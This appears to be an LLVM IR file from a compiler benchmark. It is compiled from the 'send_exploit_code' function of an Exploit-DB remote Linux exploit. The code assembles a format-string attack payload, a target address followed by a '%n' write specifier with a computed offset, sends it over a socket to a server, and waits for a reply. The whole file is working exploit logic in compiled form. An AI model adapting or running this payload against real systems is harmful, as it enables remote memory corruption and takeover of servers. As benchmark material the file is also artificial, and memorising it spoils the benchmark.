; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3787.c_send_exploit_code.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3787.c_send_exploit_code.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"1 search topic x\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"%%%lux%%%d$n\0A\00", align 1
@DF_OFFSET = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [2 x i8] c")\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @send_exploit_code(i32 %0, i64 %1, i64 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca [1024 x i8], align 16
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i64 %1, i64* %6, align 8
  store i64 %2, i64* %7, align 8
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %10, align 4
  %11 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %12 = call i32 @memset(i8* %11, i32 0, i32 1024)
  %13 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %14 = call i32 @snprintf(i8* %13, i32 1023, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  %15 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %16 = call i32 @strlen(i8* %15)
  store i32 %16, i32* %10, align 4
  %17 = load i64, i64* %6, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 %19
  %21 = bitcast i8* %20 to i64*
  store i64 %17, i64* %21, align 1
  %22 = load i32, i32* %10, align 4
  %23 = add nsw i32 %22, 4
  store i32 %23, i32* %10, align 4
  %24 = load i64, i64* %7, align 8
  %25 = icmp eq i64 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %4
  %27 = load i64, i64* %7, align 8
  %28 = add i64 %27, 65536
  store i64 %28, i64* %7, align 8
  br label %29

29:                                               ; preds = %26, %4
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i64, i64* %7, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %34, %36
  %38 = load i64, i64* @DF_OFFSET, align 8
  %39 = sub i64 %37, %38
  %40 = load i32, i32* %8, align 4
  %41 = call i32 @sprintf(i8* %33, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0), i64 %39, i32 %40)
  %42 = load i32, i32* %5, align 4
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %44 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %45 = call i32 @strlen(i8* %44)
  %46 = call i32 @send(i32 %42, i8* %43, i32 %45, i32 0)
  %47 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %48 = call i32 @memset(i8* %47, i32 0, i32 1024)
  br label %49

49:                                               ; preds = %59, %29
  %50 = load i32, i32* %5, align 4
  %51 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %52 = call i64 @recv(i32 %50, i8* %51, i32 1023, i32 0)
  %53 = icmp ne i64 %52, 0
  br i1 %53, label %54, label %60

54:                                               ; preds = %49
  %55 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %56 = call i64 @strstr(i8* %55, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %59

58:                                               ; preds = %54
  br label %60

59:                                               ; preds = %54
  br label %49

60:                                               ; preds = %58, %49
  ret i32 0
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i64, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i64 @recv(i32, i8*, i32, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
